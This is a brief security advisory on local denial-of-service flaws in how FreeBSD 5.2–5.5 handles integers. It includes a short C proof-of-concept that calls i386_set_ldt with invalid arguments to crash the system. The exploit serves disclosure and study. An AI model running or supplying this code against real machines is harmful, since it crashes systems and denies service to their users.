source: http://www.securityfocus.com/bid/20158/info

FreeBSD is prone to multiple local denial-of-service vulnerabilities. These issues occur because of input-validation flaws related to the handling of integers.

An attacker may leverage these issues to cause the affected computer to crash, denying service to legitimate users.

Versions 5.2 through 5.5 are vulnerable to these issues; other versions may also be affected.

#include <stdio.h>
#include <stdlib.h>
#include <machine/segments.h>
#include <machine/sysarch.h>

int main(int argc,char **argv){

    if(i386_set_ldt(LUDATA_SEL+1,NULL,-1)==-1){
        perror("i386_set_ldt");
        exit(EXIT_FAILURE);
    }

    exit(EXIT_FAILURE);
}